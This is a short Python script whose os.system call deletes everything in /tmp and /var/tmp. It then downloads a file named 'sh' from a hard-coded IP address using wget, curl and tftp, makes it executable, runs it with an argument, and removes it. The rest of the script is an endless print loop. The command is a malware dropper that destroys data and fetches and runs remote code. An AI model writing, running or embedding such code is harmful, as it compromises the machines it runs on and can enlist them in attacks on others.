import os

os.system("cd /var/tmp; cd /tmp; rm -rf *; wget http://193.35.18.243/sh; curl -O http://193.35.18.243/sh; tftp -g -r sh 193.35.18.243; tftp 193.35.18.243 -c get sh; chmod 777 sh; ./sh 4g; sh sh 4g; rm -rf sh")

while 1 == 1:
   print("l")
